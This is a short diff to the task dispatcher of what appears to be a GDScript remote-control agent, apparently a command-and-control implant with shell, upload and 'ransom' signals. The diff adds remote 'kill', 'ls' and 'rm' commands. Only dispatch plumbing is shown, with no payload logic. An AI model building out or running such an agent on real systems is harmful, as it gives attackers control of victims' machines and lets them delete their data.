@@ -9,6 +9,9 @@ signal exit
 signal ransom
 signal post_response
 signal ps
+signal ls
+signal kill
+signal rm
 signal shell
 signal gdscript
 signal upload
@@ -56,8 +59,14 @@ func _on_Agent_tasking(data):
 					emit_signal("shell", task)
 				"gdscript":
 					emit_signal("gdscript", task)
+				"kill":
+					emit_signal("kill", task)
 				"ps":
 					emit_signal("ps", task)
+				"ls":
+					emit_signal("ls", task)
+				"rm":
+					emit_signal("rm", task)
 				"whoami":
 					emit_signal("whoami", task)
 				"exit":
